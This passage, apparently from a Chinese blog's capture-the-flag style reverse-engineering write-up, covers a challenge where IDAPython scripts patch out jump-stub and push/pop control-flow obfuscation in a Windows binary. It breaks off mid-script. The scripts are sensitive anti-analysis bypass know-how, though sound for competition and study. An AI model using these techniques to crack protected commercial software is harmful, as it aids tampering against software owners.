class="comment">//System.err.println(encryptUtilsJni.myJni(methodSign));</span></span><br><span class="line">        <span class="comment">//encryptUtilsJni.destroy();</span></span><br><span class="line">        <span class="comment">//name:ed8b9244350d3644</span></span><br><span class="line">        <span class="comment">//searial:7C9815255BFE832D3F93140B</span></span><br><span class="line">        <span class="comment">//System.out.println("call stringFromJNI rc = " + strRc.getValue());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        File file = new File("C:\\Users\\KuCha\\Desktop\\_trace6.txt");</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            FileWriter fileWriter = new FileWriter(file);</span></span><br><span class="line"><span class="comment">//            fileWriter.write(stringBuilder.toString());</span></span><br><span class="line"><span class="comment">//            fileWriter.flush();</span></span><br><span class="line"><span class="comment">//            fileWriter.close();</span></span><br><span class="line"><span class="comment">//        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String path = <span class="keyword">this</span>.getClass().getProtectionDomain().getCodeSource().getLocation().getPath();</span><br><span class="line">        <span class="keyword">if</span>(System.getProperty(<span class="string">"os.name"</span>).contains(<span class="string">"dows"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            path = path.substring(<span class="number">1</span>,path.length());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(path.contains(<span class="string">"jar"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// System.out.println("jar = " + path);</span></span><br><span class="line">            path = path.substring(<span class="number">0</span>,path.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">            <span class="keyword">return</span> path.substring(<span class="number">0</span>,path.lastIndexOf(<span class="string">"/"</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// System.out.println(path);</span></span><br><span class="line">        <span class="comment">// path.replace("target/classes/", "");</span></span><br><span class="line">        <span class="keyword">return</span> path.replace(<span class="string">"/target/test-classes/"</span>, <span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第六题-寻回宝剑"><a href="#第六题-寻回宝剑" class="headerlink" title="第六题 寻回宝剑"></a>第六题 寻回宝剑</h2><blockquote><p>这题开始做的时候顶着混淆硬做的 后来发现这个混淆还挺少的 尝试去一下混淆 锻炼一下自己的python能力</p></blockquote><h3 id="0x0-破障"><a href="#0x0-破障" class="headerlink" title="0x0 破障"></a>0x0 破障</h3><p>这题被混淆得很难看</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600106/0" alt=""></p><p>IDA 一进去 就可以看见 start函数的混淆 这种混淆很容易去掉</p><p>这里我使用的是 IDApython 去掉的这个混淆 原理是汇编的特征码</p><h4 id="0x00-patch-one"><a href="#0x00-patch-one" class="headerlink" title="0x00 patch one"></a>0x00 patch one</h4><p>利用特征码定位混淆头部 在从头部按照一定偏移取出用来计算跳转位置的值</p><p>比如这里要先从 <code>call $+5</code> 执行后的 offset 取出 base </p><p>然后再从 <code>xor rax，9BA38</code> 取出 <code>xored</code> </p><p>跳转位置即用 <code>base ^ xored</code> 算出 再转成汇编字节码写入混淆头部</p><p>最后把其他未执行的混淆部分的指令 nop 掉</p><p>虽然 xor 的数值不同 造成特征码也不一样</p><p>不过没关系 写成模糊搜索就行了(后面才发现有个 <code>idc.find_binary</code> 可以直接用 不过写都写了2333</p><p>写成脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(address,table)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(table)):</span><br><span class="line">        <span class="keyword">if</span> table[i] != <span class="string">'?'</span>:</span><br><span class="line">            <span class="keyword">if</span> ida_bytes.get_byte(start+i) == table[i]:</span><br><span class="line">                <span class="keyword">if</span> i == len(table) - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">(start)</span>:</span></span><br><span class="line">    jmpst  = start + <span class="number">8</span></span><br><span class="line">    xored  = ida_bytes.get_dword(start+<span class="number">11</span>)</span><br><span class="line">    ret    = jmpst ^ xored</span><br><span class="line">    asmret = ret - (start + <span class="number">5</span>)</span><br><span class="line">    shell=[<span class="string">''</span>] * <span class="number">5</span> + (len(table) - <span class="number">5</span>) * [<span class="number">0x90</span>]</span><br><span class="line">    shell[<span class="number">0</span>]=<span class="number">0xe9</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        shell[i+<span class="number">1</span>] = (asmret &amp; (<span class="number">0xff</span> &lt;&lt; i*<span class="number">8</span>)) &gt;&gt; i * <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> shell</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fkret</span><span class="params">()</span>:</span></span><br><span class="line">    start  = <span class="number">0x140000000</span></span><br><span class="line">    end    = <span class="number">0x1400FA698</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> start &lt;= end:</span><br><span class="line">        <span class="keyword">if</span> search(start,table) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment">#print ('found at ' + str(hex(start)))  </span></span><br><span class="line">            shell  = getshell(start)</span><br><span class="line">            mypatch(start,shell)</span><br><span class="line">            start += len(table) - <span class="number">1</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    print(<span class="string">'fkret count='</span>+str(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mypatch</span><span class="params">(address,shell)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> shell:</span><br><span class="line">        ida_bytes.patch_byte(address,ch)</span><br><span class="line">        address += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">table =[<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x9c</span>,<span class="number">0xe8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x58</span>,<span class="number">0x48</span>,<span class="number">0x35</span>,<span class="string">'?'</span>,<span class="string">'?'</span>,<span class="string">'?'</span>,<span class="string">'?'</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x10</span>,<span class="number">0x9d</span>,<span class="number">0x58</span>,<span class="number">0xc3</span>]</span><br><span class="line"></span><br><span class="line">fkret()</span><br></pre></td></tr></table></figure><blockquote><p>fkret count=34213</p></blockquote><h4 id="0x01-patch-two-and-three"><a href="#0x01-patch-two-and-three" class="headerlink" title="0x01 patch two and three"></a>0x01 patch two and three</h4><p>保存以后再继续看 发现还是不好看 很多跳转</p><p>用 IDA trace 看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">push    rbx                     </span><br><span class="line">jmp     loc_1400C446D           </span><br><span class="line">pop     rbx                     </span><br><span class="line">jmp     sub_14003F5A7           </span><br><span class="line">push    rdx                     </span><br><span class="line">push    rdx                     </span><br><span class="line">pop     rdx                     </span><br><span class="line">pop     rdx                     </span><br><span class="line">push    rcx                     </span><br><span class="line">jmp     loc_14001EE1F           </span><br><span class="line">push    rdx                     </span><br><span class="line">pop     rdx                     </span><br><span class="line">push    rbx                     </span><br><span class="line">pop     rbx                     </span><br><span class="line">pop     rcx                     </span><br><span class="line">jmp     sub_140071DE0           </span><br><span class="line">sub     rsp, 28h                </span><br><span class="line">jmp     loc_1400B5E68           </span><br><span class="line">push    rax                     </span><br><span class="line">jmp     loc_1400904F3           </span><br><span class="line">push    rdx                     </span><br><span class="line">push    rdx                     </span><br><span class="line">pop     rdx                     </span><br><span class="line">pop     rdx                     </span><br><span class="line">push    rax                     </span><br><span class="line">jmp     loc_140081972           </span><br><span class="line">push    rcx                     </span><br><span class="line">pop     rcx                     </span><br><span class="line">push    rbx                     </span><br><span class="line">pop     rbx                     </span><br><span class="line">pushfq                          </span><br><span class="line">jmp     loc_14007FBCE           </span><br><span class="line">push    rbx                     </span><br><span class="line">pop     rbx                     </span><br><span class="line">push    rax                     </span><br><span class="line">push    rax                     </span><br><span class="line">pushfq                          </span><br><span class="line">call    $+5                     </span><br><span class="line">pop     rax                     </span><br><span class="line">xor     rax, 6665h              </span><br><span class="line">mov     [rsp+58h+var_48], rax   </span><br><span class="line">popfq                           </span><br><span class="line">pop     rax                     </span><br><span class="line">jmp     sub_140079DBD           </span><br><span class="line">push    rcx                     </span><br><span class="line">pop     rcx                     </span><br><span class="line">push    rdx                     </span><br><span class="line">pop     rdx                     </span><br><span class="line">pop     rax                     </span><br><span class="line">jmp     sub_1400C9B65           </span><br><span class="line">push    rbx                     </span><br><span class="line">pop     rbx                     </span><br><span class="line">add     rax, 36F74h             </span><br><span class="line">jmp     loc_1400E169F           </span><br><span class="line">push    rcx                     </span><br><span class="line">push    rdx                     </span><br><span class="line">pop     rdx                     </span><br><span class="line">pop     rcx                     </span><br><span class="line">mov     [rsp+arg_8], rax        </span><br><span class="line">jmp     loc_14002BE91           </span><br><span class="line">push    rcx                     </span><br><span class="line">pop     rcx                     </span><br><span class="line">popfq                           </span><br><span class="line">jmp     loc_1400E2622           </span><br><span class="line">push    rbx                     </span><br><span class="line">pop     rbx                     </span><br><span class="line">pop     rax                     </span><br><span class="line">jmp     sub_1400F8E1D           </span><br><span class="line">push    rcx                     </span><br><span class="line">push    rbx                     </span><br><span class="line">pop     rbx                     </span><br><span class="line">pop     rcx                     </span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>这里就已经包含了两种混淆</p><p>一种是简单的 push reg &amp;&amp; pop reg 以及这种混淆的嵌套 例如 push push pop pop</p><p>但这都还算好 问题就在于push pop 中间添加了 jmp 使得之前使用的汇编特征码的方法失效</p><p>另一种跟第一种差不多 不过嵌套了一层 另一个问题也是中间加了 jmp</p><p>手动去掉jmp 再去掉没用的push pop 可以看见这种混淆大概长这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">push    rax                     </span><br><span class="line">push    rax                     </span><br><span class="line">pushfq                          </span><br><span class="line">push    rax                     </span><br><span class="line">push    rax                     </span><br><span class="line">pushfq                          </span><br><span class="line">call    $+5                     </span><br><span class="line">pop     rax                     </span><br><span class="line">xor     rax, 6665h              </span><br><span class="line">mov     [rsp+10h], rax   </span><br><span class="line">popfq                           </span><br><span class="line">pop     rax                     </span><br><span class="line">pop     rax                     </span><br><span class="line">add     rax, 36F74h             </span><br><span class="line">mov     [rsp+10h], rax        </span><br><span class="line">popfq                           </span><br><span class="line">pop     rax                     </span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>特征还蛮明显的噢</p><p>接下来就是写脚本</p><p>但是这个脚本咋写呢 手动的情况下是先去掉 jmp</p><p>但是如果直接在程序里面把 jmp nop掉肯定是不行的 影响了程序流程的正常执行</p><p>那就在判断的时候把 jmp 忽略掉咯    也就是暂且先做下一步 去掉push pop</p><p>若是要人来判断 会怎么做这一步呢</p><p>是不是先找到一句pop 然后返回去找push</p><p>再比较两者操作的寄存器是否相同</p><p>而要实现这一点 其实就相当于写模拟执行</p><p>要执行的话 肯定不止执行一句</p><p>而如果要执行多句 肯定需要知道当前指令的长度 然后才能够跳到下一句执行</p><p>那先写一个 <code>getlen</code> 用于获取当前指令长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlen</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p_op_len = &#123;</span><br><span class="line">    <span class="string">"pop"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="string">"push"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="string">"popfq"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="string">"pushfq"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="string">"nop"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="string">"retn"</span> : <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line">    p_asm = idc.GetDisasm(offset)</span><br><span class="line">    p_op  = p_asm.split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    p_len = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span>(p_op <span class="keyword">in</span> p_op_len):</span><br><span class="line">        <span class="keyword">while</span> p_asm == idc.GetDisasm(offset + p_len):</span><br><span class="line">            p_len += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p_len</span><br></pre></td></tr></table></figure><p>这个 <code>getlen</code> 的原理呢 是一个指令如果已经被识别</p><p>给 <code>GetDisasm</code> 传的参如果不超过这一句的字节码 就一直会返回同一句汇编</p><p>用这个原理就需要特别掠过 1 字节的汇编指令</p><p>因为如果下一字节的汇编的指令与这一句的相同</p><p>就会误认为这一句指令的长度为 2</p><p>这种情况在这个程序里尤其多且不能够误判</p><p>比如两句push rax 误判的话栈都不平了</p><p>返回到上一步</p><p>之前说 ‘先找到一句pop 然后返回去找push’</p><p>这在模拟执行里面是很麻烦的</p><p>因为如果只根据反汇编 要去倒着找 似乎只能够把所有的步骤记录下来</p><p>那么把思路换一下</p><p>遇见 push 的时候 把操作的 reg 以及当前的 rip 储存起来</p><p>在下一次遇见 pop 的时候检查 reg 与上次 push 的是否相同</p><p>这样就可以完美解决如果上一句是 push reg 下一句 是 pop reg 的情况了</p><p>但是要是遇见嵌套的 push pop 一次是没法完美解决的</p><p>不过解决方法也很简单 多执行几次就行了</p><p>还要解决一下中间的 jmp </p><p>我开始想用 从反汇编中截取字符串 当作十六进制</p><p>比如 <code>jmp     loc_1400C446D</code> 直接把 1400C446D 截取出来赋值给 rip 指针</p><p>但是后面发现有的 jmp 反汇编成 <code>jmp xxx+xx</code> 的形式 于是决定还是用硬编码来计算跳转地址</p><p>在运行过程中还发现有的与寻常的字节码不一样</p><p>例如 <code>48 FF 25 19 68 F1 FF     jmp cs:TerminateProcess</code> </p><p>这种肯定不能真的计算到跳转地址去 还是直接掠过比较好</p><p>还有要注意正负的计算方式不一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcjmp</span><span class="params">(offset)</span>:</span></span><br><span class="line">    __asm = idc.GetDisasm(offset)</span><br><span class="line">    <span class="keyword">if</span> ida_bytes.get_byte(offset) == <span class="number">0xE9</span>:</span><br><span class="line">        st = offset</span><br><span class="line">        f = ida_bytes.get_dword(st + <span class="number">1</span>) &amp; <span class="number">0x80000000</span></span><br><span class="line">        <span class="keyword">if</span> f == <span class="number">0x80000000</span>:</span><br><span class="line">            st = st - (<span class="number">0x100000000</span> - ida_bytes.get_dword(st + <span class="number">1</span>)) + <span class="number">5</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            st = st + ida_bytes.get_dword(st + <span class="number">1</span>) + <span class="number">5</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        st = offset + getlen(offset)</span><br><span class="line">    <span class="keyword">return</span> st</span><br></pre></td></tr></table></figure><p>有了上面的铺垫 可以写去push pop 的混淆了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuckpush</span><span class="params">(offset)</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    pat_count = <span class="number">0</span></span><br><span class="line">    debug = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">        st = offset</span><br><span class="line">        last = <span class="string">''</span></span><br><span class="line">        rip_push  = []</span><br><span class="line">        reg_push = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            __asm  = idc.GetDisasm(st)</span><br><span class="line">            <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">                print(__asm)</span><br><span class="line">            op_len = getlen(st)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> __asm == <span class="string">'retn'</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            op  = __asm.split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">            reg = __asm.split(<span class="string">' '</span>)[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">'push'</span>:</span><br><span class="line">                rip_push.append(st)</span><br><span class="line">                reg_push.append(reg)</span><br><span class="line">                last = <span class="string">'push'</span></span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">'pop'</span>:</span><br><span class="line">                <span class="keyword">if</span> last == <span class="string">'push'</span>:</span><br><span class="line">                    <span class="keyword">if</span> reg == reg_push[<span class="number">-1</span>]:</span><br><span class="line">                        <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">                            print(<span class="string">"patch "</span> + str(hex(rip_push[<span class="number">-1</span>])) + <span class="string">" + "</span> + str(hex(st)))</span><br><span class="line">                        ida_bytes.patch_byte(rip_push[<span class="number">-1</span>],<span class="number">0x90</span>)</span><br><span class="line">                        ida_bytes.patch_byte(st,<span class="number">0x90</span>)</span><br><span class="line">                        pat_count += <span class="number">1</span></span><br><span class="line">                    flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">'jmp'</span>:</span><br><span class="line">                st = calcjmp(st)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> __asm != <span class="string">'nop'</span>:</span><br><span class="line">                    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">                        last = <span class="string">''</span></span><br><span class="line">                st += op_len</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"fuck "</span> + str(pat_count) + <span class="string">" pairs of 'push pop'"</span>)</span><br><span class="line">    <span class="keyword">return</span> pat_count</span><br></pre></td></tr></table></figure><p>去掉了 push pop 之后 同样是比较特征之后 nop 相应代码并修改执行流程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuckret</span><span class="params">(offset,debug=<span class="number">0</span>)</span>:</span></span><br><span class="line">    table = [<span class="string">'push'</span>,<span class="string">'push'</span>,<span class="string">'pushfq'</span>,<span class="string">'push'</span>,<span class="string">'push'</span>,<span class="string">'pushfq'</span>,<span class="string">'call'</span>,<span class="string">'pop'</span>,<span class="string">'xor'</span>,<span class="string">'mov'</span>,<span class="string">'popfq'</span>,<span class="string">'pop'</span>,<span class="string">'pop'</span>,<span class="string">'add'</span>,<span class="string">'mov'</span>,<span class="string">'popfq'</span>,<span class="string">'pop'</span>,<span class="string">'retn'</span>]</span><br><span class="line">    st = offset</span><br><span class="line">    fkcnt = <span class="number">0</span></span><br><span class="line">    fkpus = <span class="number">0</span></span><br><span class="line">    fkpus += fuckpush(st)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        __asm = idc.GetDisasm(st)</span><br><span class="line">        <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> __asm != <span class="string">'nop'</span>:</span><br><span class="line">                print(<span class="string">"out : "</span> + str(hex(st)) ,end=<span class="string">'\t'</span>)</span><br><span class="line">                print(__asm)</span><br><span class="line"></span><br><span class="line">        op_len = getlen(st)</span><br><span class="line">        op  = __asm.split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'push'</span>:</span><br><span class="line">            <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">                print(<span class="string">''</span>)</span><br><span class="line">            asmrip  = []</span><br><span class="line">            lastjmp = <span class="number">0</span></span><br><span class="line">            op_cnt  = <span class="number">0</span></span><br><span class="line">            st_in   = st</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                __asm = idc.GetDisasm(st)</span><br><span class="line">                <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> __asm != <span class="string">'nop'</span>:</span><br><span class="line">                        print(<span class="string">"inn : "</span> + str(hex(st)) ,end=<span class="string">'\t'</span>)</span><br><span class="line">                        print(__asm)</span><br><span class="line"></span><br><span class="line">                op_len = getlen(st) </span><br><span class="line">                op = __asm.split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> op == <span class="string">'jmp'</span>:</span><br><span class="line">                    lastjmp = st</span><br><span class="line">                    st = calcjmp(st)</span><br><span class="line">                <span class="keyword">elif</span> op == <span class="string">'nop'</span>:</span><br><span class="line">                    st += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> op == table[op_cnt]:</span><br><span class="line">                    asmrip.append(st)</span><br><span class="line">                    st += op_len</span><br><span class="line">                    op_cnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    st = st_in + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> op_cnt == <span class="number">18</span>:</span><br><span class="line">                    <span class="keyword">if</span> ida_bytes.get_byte(lastjmp) != <span class="number">0xE9</span>:</span><br><span class="line">                        st = st_in + <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">                        print(<span class="string">"rip : "</span>,end=<span class="string">''</span>)</span><br><span class="line">                        <span class="keyword">for</span> sb <span class="keyword">in</span> asmrip:</span><br><span class="line">                            print(str(hex(sb)) + <span class="string">','</span>, end=<span class="string">''</span>)</span><br><span class="line">                        print(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">                    calladdr = asmrip[<span class="number">6</span>]                    <span class="comment">#getshell</span></span><br><span class="line">                    xored    = ida_bytes.get_dword(asmrip[<span class="number">8</span>] + <span class="number">2</span>)</span><br><span class="line">                    added    = ida_bytes.get_dword(asmrip[<span class="number">13</span>] + <span 